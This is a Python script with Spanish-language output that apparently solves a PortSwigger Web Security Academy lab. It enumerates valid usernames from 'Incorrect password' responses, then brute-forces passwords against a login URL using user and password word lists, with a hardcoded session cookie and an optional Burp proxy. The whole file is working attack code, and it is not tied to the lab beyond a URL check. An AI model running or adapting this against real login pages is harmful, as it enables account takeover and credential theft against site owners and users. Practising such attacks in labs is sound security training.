#!/usr/bin/python3

import threading
import requests
import json
import pdb
import sys
import re
from pwn import *


headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0",
}

cookies = {
    "session":"UkXbBJQ1SihVCxRpoS8XfCXdj6A3J3EU"
}


data = {
    "username":"username",
    "password":"password"
}

burp = {"https":"http://127.0.0.1:8080/"}

users = open("users").read().splitlines()
passwords = open("passwords").read().splitlines()


valid_users = []

def brute_force_attack(url):
    main_url = url

    p1 = log.progress("User")
    p1.status("Iniciando Fuerza Bruta")
    p2 = log.progress("Password")
    p2.status("Iniciando Fuerza Bruta")
    p3 = log.progress("Valid Users")
    p3.status("Iniciando Fuerza Bruta")

    time.sleep(2)
    p3.status(" ")

    for user in users:
        data["username"] = user

        p1.status(user)
        p2.status("password")

        r = requests.post(main_url, headers=headers, cookies=cookies, data=data)
        if r.status_code == 504:
            print("\n[!] Servidor no responde [504 Gateaway Timeout]\n")
            exit()

        if "Incorrect password" in r.text:
            valid_users.append(user)
            p3.status(", ".join(valid_users))

    for username in valid_users:
        p1.status(username)
        data["username"] = username
        for password in passwords:
            p2.status(password)
            data["password"] = password

            r = requests.post(main_url, headers=headers, cookies=cookies, data=data)
            if "Incorrect password" not in r.text:
                print(f"[+] VALID CREDENTIALS:\n\tusername: {username}\n\tpassword: {password}")
                break

def print_help_panel():
    print(f"""
Uso: python3 {sys.argv[0]} [opciones]

Ejemplo: python3 {sys.argv[0]} -u https://0a25005b03608378879d139e001000ab.web-security-academy.net/login

Opciones:
  -h, --help                       Muestra este mensaje de ayuda.
  -u, --url <PortSwigger URL Lab>  URL del laboratorio de PortSwigger.
""")
    exit()

if __name__ == "__main__":
    if len(sys.argv) < 2 or "-h" in sys.argv or "--help" in sys.argv:
        print_help_panel()

    if sys.argv[1] == "-u" or sys.argv[1] == "--url":
        url = sys.argv[2]

        if "https://" in url and "/login" in url:
            brute_force_attack(url)
        else:
            print("\n[!] Invalid URL Login\n")
    else:
        print_help_panel()













